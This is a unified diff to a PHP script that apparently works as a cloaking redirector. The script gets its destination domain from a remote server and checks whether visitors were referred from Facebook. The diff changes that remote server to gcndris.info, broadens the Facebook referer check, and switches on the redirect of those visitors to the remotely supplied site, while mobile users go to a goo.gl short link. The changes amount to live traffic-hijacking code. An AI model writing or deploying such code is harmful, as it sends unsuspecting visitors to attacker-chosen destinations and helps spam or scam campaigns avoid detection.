@@ -36,7 +36,7 @@
 	}
 	function getSite(){
 		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, 'http://porti.us/php/site.php');
+		curl_setopt($ch, CURLOPT_URL, 'http://gcndris.info/php/site.php');
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 		$site = curl_exec($ch);
 		curl_close($ch);
@@ -58,7 +58,7 @@
 	}
 	if($action == 'site'){
 		$_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-		$refs = array('www.facebook.com');
+		$refs = array('facebook.com');
 		$action = 'theme';
 		foreach ($refs as $ref) {
 			if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
@@ -110,8 +110,8 @@
 	if($action == 'mobile'){
 		header('Location: https://goo.gl/vpZfUC?'.rand(11111,99999));
 	}else if($action == 'site'){
-		//$app_site = getSite();
-		echo 'test';
+		$app_site = getSite();
+		header("Location: http://$app_site/$id");
 	}else{
 		@ob_end_clean();
 		@ob_end_flush();
